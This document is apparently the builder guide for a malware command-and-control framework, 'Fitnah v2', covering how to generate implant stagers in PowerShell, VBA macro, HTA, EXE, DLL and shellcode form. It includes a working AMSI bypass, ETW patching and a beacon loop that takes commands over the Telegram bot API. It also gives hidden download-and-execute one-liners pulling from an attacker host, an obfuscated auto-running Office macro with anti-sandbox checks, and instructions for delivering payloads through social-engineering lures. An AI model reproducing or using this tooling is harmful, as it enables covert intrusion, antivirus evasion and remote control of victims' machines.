# Builder Guide — Fitnah v2

The Fitnah builder generates implant stagers — small loaders that bootstrap a full implant on the target. You run the builder from the operator console; it injects the bot token, chat ID, and agent ID into the output, then optionally compiles or packages the result.

---

## Output Formats

| Format | Extension | Description | Requirements |
|---|---|---|---|
| `ps1` | `.ps1` | PowerShell beacon-loop stager | None — pure PS |
| `vba` | `.vba` | VBA macro for Office documents | None — pure VBA |
| `hta` | `.hta` | HTML Application dropper | None — pure HTML/JS |
| `exe` | `.exe` | Native Windows PE | mingw-w64 |
| `dll` | `.dll` | Native Windows DLL | mingw-w64 |
| `shellcode` | `.bin` | Raw x64 shellcode | mingw-w64 + donut |

---

## Console Usage

```
op_nightfall > builder -f ps1 -a <agent_id>
op_nightfall > builder -f exe -a <agent_id> --arch x64
op_nightfall > builder -f vba -a <agent_id>
op_nightfall > builder --list                     # list build directory
```

### All flags

| Flag | Default | Description |
|---|---|---|
| `-f <format>` | `ps1` | Output format |
| `-a <agent_id>` | active session | Agent ID to bake in |
| `--arch x64\|x86` | `x64` | CPU architecture (exe/dll/shellcode only) |
| `--sleep N` | `5` | Beacon sleep seconds |
| `--jitter N` | `20` | Jitter percentage |
| `--encrypt <algo>` | auto | `none` `xor` `aes-256-gcm` |
| `--out <name>` | auto | Output filename |
| `--list` | — | List existing builds |

Default encryption: `aes-256-gcm` for exe/dll/shellcode, `none` for scripts.

---

## PowerShell Stager (ps1)

The PS1 stager is the most portable option. It runs on any Windows host with PowerShell 3+ and no additional tools.

### What it does

1. Bypasses AMSI using a reflection-based patch
2. Bypasses ETW by patching `EtwEventWrite`
3. Enters a beacon loop:
   - Calls `Invoke-RestMethod` to poll `api.telegram.org/bot<TOKEN>/getUpdates`
   - Parses JSON for TASK messages matching the chat ID
   - Executes commands via `Invoke-Expression` or `cmd /c`
   - Posts ACK back via `Invoke-RestMethod`
4. Sleeps with jitter between each poll

### Example generated code structure
```powershell
$ErrorActionPreference = 'SilentlyContinue'

# -- Stealth & Anti-Analysis --
function <random> {
    # AMSI bypass via reflection
    $p = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $p.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
}
function <random> {
    # ETW bypass
    $e = [System.Runtime.InteropServices.Marshal]
    # ... patch EtwEventWrite
}

# -- Beacon loop --
$token   = "<BOT_TOKEN>"
$chat_id = "<CHAT_ID>"
$agent   = "<AGENT_ID>"
$sleep   = <SLEEP>
$jitter  = <JITTER>

while ($true) {
    $updates = Invoke-RestMethod "https://api.telegram.org/bot$token/getUpdates" ...
    # process tasks
    Start-Sleep -Seconds ($sleep + (Get-Random -Minimum (-$delta) -Maximum $delta))
}
```

### Delivery
```powershell
# One-liner download-and-execute
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/stager.ps1')"
```

---

## VBA Macro Stager (vba)

The VBA stager is designed to be pasted into an Office document's macro editor. It uses heavy obfuscation to defeat signature-based AV.

### Anti-analysis features
- All variable names are randomly generated 8-12 character strings
- The PS1 payload is base64-encoded (UTF-16-LE) and split into 100-char VBA string concatenation chunks
- An anti-sandbox check verifies the environment before execution
- Junk code loops are inserted between real logic
- Random `VB_Name` attribute obscures the module name

### Structure
```vba
Attribute VB_Name = "<random10>"

Sub AutoOpen()      ' Fires when doc is opened
    <random12>      ' Calls the main loader
End Sub

Sub Document_Open() ' Fires in newer Word versions
    <random12>
End Sub

Private Sub <random12>()
    Dim <v1> As String    ' Accumulates base64 PS1 payload
    <v1> = ""
    <v1> = <v1> & "<chunk1>"
    <v1> = <v1> & "<chunk2>"
    ...
    If <anti_sandbox>() Then
        <v2> = "powershell -nop -w hidden -ep bypass -c ..."
        Set <v3> = CreateObject("WScript.Shell")
        <v3>.Run <v2>, 0, False
    End If
End Sub
```

### Embedding into a Word document
1. Open Word → Developer tab → Visual Basic
2. Insert → Module
3. Paste the VBA output
4. Save as `.docm` or `.xlsm`
5. Enable macros, or use a social engineering lure

---

## HTA Dropper (hta)

HTML Applications (`.hta`) run with full trust in Internet Explorer (still present on most Windows systems) and have access to Windows Scripting Host objects.

### Structure
```html
<html>
<head>
  <hta:application applicationname="Update" windowstate="minimize" showintaskbar="no"/>
  <script language="VBScript">
    Sub Window_OnLoad
      ' Execute PowerShell stager
      Set oShell = CreateObject("WScript.Shell")
      oShell.Run "powershell -nop -w hidden ...", 0, False
      Self.Close
    End Sub
  </script>
</head>
<body></body>
</html>
```

### Delivery
```
mshta http://attacker/update.hta
mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('...');"
```

---

## Native EXE / DLL (exe, dll)

Requires `mingw-w64` installed on the operator workstation. The builder calls `Makefile` in the `implant/` directory.

```
op_nightfall > builder -f exe -a agent-001 --arch x64 --sleep 10
# Runs: x86_64-w64-mingw32-gcc [all sources] -DFITNAH_BOT_TOKEN=... -o build/fitnah_x64.exe
```

The EXE includes the full C implant with all evasion modules linked in.

---

## Shellcode (shellcode)

Requires both `mingw-w64` and `donut` (PE-to-shellcode converter).

```
op_nightfall > builder -f shellcode -a agent-001
# 1. Builds fitnah_x64.exe
# 2. Runs: donut -f 1 -a 2 -o build/fitnah_x64.bin fitnah_x64.exe
```

The resulting `.bin` file is position-independent shellcode suitable for injection via `dll_inject`, `process_hollow`, or `code_cave_inject`.

---

## Encryption Options

| Option | What it does |
|---|---|
| `none` | No encryption — plaintext payload |
| `xor` | XOR with random key — simple, defeats static strings |
| `aes-256-gcm` | AES-256-GCM with random key + nonce — strong |

For `aes-256-gcm`, the builder:
1. Generates a random 32-byte key and 16-byte nonce
2. Encrypts the payload
3. Emits a C header (`key.h`) with `FITNAH_KEY[]` and `FITNAH_NONCE[]` arrays
4. Compiles with that header — the stub decrypts itself at runtime

---

## Build Directory

All outputs go to `build/` (relative to project root):

```
build/
  fitnah_x64.exe          Native 64-bit implant
  fitnah_x86.exe          Native 32-bit implant
  fitnah_x64.bin          Shellcode
  stager_agent001.ps1     PowerShell stager
  stager_agent001.vba     VBA macro
  stager_agent001.hta     HTA dropper
```

```
op_nightfall > builder --list   # shows all files with size and timestamp
```
